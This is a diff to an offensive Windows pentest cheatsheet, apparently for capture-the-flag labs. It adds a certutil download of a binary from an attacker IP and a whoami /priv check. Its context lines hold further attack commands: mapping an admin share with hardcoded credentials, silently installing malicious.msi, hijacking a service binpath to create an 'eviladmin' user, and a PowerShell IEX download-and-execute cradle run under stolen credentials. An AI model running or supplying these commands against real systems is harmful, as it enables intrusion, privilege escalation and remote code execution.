@@ -1,5 +1,14 @@
 # Cheatsheet
 
+## Moving files
+
+> - Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
+
+```
+certutil -verifyctl -split -f ​ http://10.10.14.8/taskkill.exe
+mv *.bin taskkill.exe
+```
+
 ## Extract ZIP
 ```
 Add-Type -assembly
@@ -17,7 +26,7 @@ gdr -PSProvider 'FileSystem'
 net use y: \\10.10.10.57\c$ /user:administrator 1234test
 ```
 
-## Invoke command with credentials 
+## Invoke command with credentials
 ```
 $user = '.\administrator';
 $psw = '1234test';
@@ -51,6 +60,7 @@ msiexec /quiet /qn /i malicious.msi
 - Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
 - View service properties: `sc qc "Vulnerable Service"`
 - Restarting: `sc stop "Vulnerable Service"`
+- Service information: `Get-Service​ ​ "Ubiquiti UniFi Video"​ | fl *`
 - Restart PC: `shutdown /r /t 0`
 - Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`
 
@@ -68,6 +78,10 @@ $creds = New-Object System.Management.Automation.PSCredential('administrator' $p
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
 ```
 ## Permissions
+
+```
+whoami /priv
+```
 
 ## View Permisions
 ```
